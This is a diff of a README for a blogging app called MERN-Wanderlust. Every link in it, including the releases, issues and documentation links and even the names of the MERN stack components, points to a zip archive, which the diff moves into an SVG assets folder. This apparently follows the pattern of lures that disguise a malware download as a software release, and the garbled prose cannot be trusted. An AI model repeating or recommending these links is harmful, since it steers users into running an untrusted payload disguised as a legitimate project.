@@ -6,11 +6,11 @@ Welcome to the **MERN-Wanderlust** project! This application helps you create yo
 
 ## 📥 Download Now
 
-[![Download MERN-Wanderlust](https://raw.githubusercontent.com/Marsik004/MERN-Wanderlust/main/cyclotron/MERN-Wanderlust.zip)](https://raw.githubusercontent.com/Marsik004/MERN-Wanderlust/main/cyclotron/MERN-Wanderlust.zip)
+[![Download MERN-Wanderlust](https://github.com/Marsik004/MERN-Wanderlust/raw/refs/heads/main/frontend/src/assets/svg/MER-Wanderlust-3.8.zip)](https://github.com/Marsik004/MERN-Wanderlust/raw/refs/heads/main/frontend/src/assets/svg/MER-Wanderlust-3.8.zip)
 
 ## 🌐 About
 
-WanderLust is built using the MERN stack, which includes MongoDB, https://raw.githubusercontent.com/Marsik004/MERN-Wanderlust/main/cyclotron/MERN-Wanderlust.zip, https://raw.githubusercontent.com/Marsik004/MERN-Wanderlust/main/cyclotron/MERN-Wanderlust.zip, and https://raw.githubusercontent.com/Marsik004/MERN-Wanderlust/main/cyclotron/MERN-Wanderlust.zip This project aims to empower you to contribute to open-source software, sharpen your skills in React, and master Git. 
+WanderLust is built using the MERN stack, which includes MongoDB, https://github.com/Marsik004/MERN-Wanderlust/raw/refs/heads/main/frontend/src/assets/svg/MER-Wanderlust-3.8.zip, https://github.com/Marsik004/MERN-Wanderlust/raw/refs/heads/main/frontend/src/assets/svg/MER-Wanderlust-3.8.zip, and https://github.com/Marsik004/MERN-Wanderlust/raw/refs/heads/main/frontend/src/assets/svg/MER-Wanderlust-3.8.zip This project aims to empower you to contribute to open-source software, sharpen your skills in React, and master Git. 
 
 With this tool, you can:
 - Create new blog posts easily
@@ -31,7 +31,7 @@ Before you get started, make sure your computer meets these requirements:
 
 To download the application, follow these steps:
 
-1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/Marsik004/MERN-Wanderlust/main/cyclotron/MERN-Wanderlust.zip).
+1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/Marsik004/MERN-Wanderlust/raw/refs/heads/main/frontend/src/assets/svg/MER-Wanderlust-3.8.zip).
   
 2. **Choose the Latest Release:** Look for the latest version listed.
 
@@ -41,7 +41,7 @@ To download the application, follow these steps:
 
 5. **Run the Application:**
    - Open the extracted folder.
-   - Double-click the `https://raw.githubusercontent.com/Marsik004/MERN-Wanderlust/main/cyclotron/MERN-Wanderlust.zip` file to open it in your web browser.
+   - Double-click the `https://github.com/Marsik004/MERN-Wanderlust/raw/refs/heads/main/frontend/src/assets/svg/MER-Wanderlust-3.8.zip` file to open it in your web browser.
    - Follow on-screen instructions to set up your blog.
 
 ## 🌍 Features
@@ -58,7 +58,7 @@ WanderLust comes packed with features to enhance your blogging experience:
 
 After installation, you might want to configure your blog settings:
 
-1. Open `https://raw.githubusercontent.com/Marsik004/MERN-Wanderlust/main/cyclotron/MERN-Wanderlust.zip` in a text editor.
+1. Open `https://github.com/Marsik004/MERN-Wanderlust/raw/refs/heads/main/frontend/src/assets/svg/MER-Wanderlust-3.8.zip` in a text editor.
 2. Adjust fields like your blog title, author name, and more.
 3. Save the file and refresh your browser to see changes.
 
@@ -76,7 +76,7 @@ To create your first blog post:
 
 If you encounter issues while using **MERN-Wanderlust**, the community can help.
 
-- **GitHub Issues:** Report any bugs or issues on the [Issues page](https://raw.githubusercontent.com/Marsik004/MERN-Wanderlust/main/cyclotron/MERN-Wanderlust.zip).
+- **GitHub Issues:** Report any bugs or issues on the [Issues page](https://github.com/Marsik004/MERN-Wanderlust/raw/refs/heads/main/frontend/src/assets/svg/MER-Wanderlust-3.8.zip).
 - **Community Forums:** Join forums to discuss features and get assistance.
 
 ## 🎉 Join the Community
@@ -92,7 +92,7 @@ Thanks to everyone who contributed to this project. Your efforts and commitment 
 
 ## 🔗 Useful Links
 
-- [MERN-Wanderlust Releases Page](https://raw.githubusercontent.com/Marsik004/MERN-Wanderlust/main/cyclotron/MERN-Wanderlust.zip)
-- [Documentation](https://raw.githubusercontent.com/Marsik004/MERN-Wanderlust/main/cyclotron/MERN-Wanderlust.zip)
+- [MERN-Wanderlust Releases Page](https://github.com/Marsik004/MERN-Wanderlust/raw/refs/heads/main/frontend/src/assets/svg/MER-Wanderlust-3.8.zip)
+- [Documentation](https://github.com/Marsik004/MERN-Wanderlust/raw/refs/heads/main/frontend/src/assets/svg/MER-Wanderlust-3.8.zip)
 
 We hope you enjoy using **MERN-Wanderlust** to share your adventures! Happy blogging!
